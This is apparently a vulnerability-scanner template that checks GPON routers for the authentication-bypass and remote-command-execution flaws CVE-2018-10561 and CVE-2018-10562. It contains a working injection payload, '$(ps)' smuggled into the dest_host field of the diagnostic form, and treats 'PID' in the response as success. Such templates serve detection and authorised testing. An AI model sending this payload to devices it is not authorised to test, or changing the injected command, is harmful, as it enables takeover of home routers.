id: gpon-rce
info:
  name: GPON Router Authentication Bypass & RCE
  author: lupedsagaces
  severity: critical
  description: |
    Explores authentication bypass and remote command execution vulnerabilities in GPON routers (CVE-2018-10561, CVE-2018-10562).   Medium: https://medium.com/@knownsec404team/analysis-of-gpon-home-gateway-remote-command-execution-vulnerability-48fa8d5cdc15

requests:
  - method: GET
    path:
      - "{{BaseURL}}/GponForm/diag_Form?diagCmd=ping&dest_host=$(ps)"
    matchers:
      - type: word
        words:
          - "PID"  # Verifica se a resposta contém a saída do comando `ps`, indicando sucesso na exploração
        condition: and

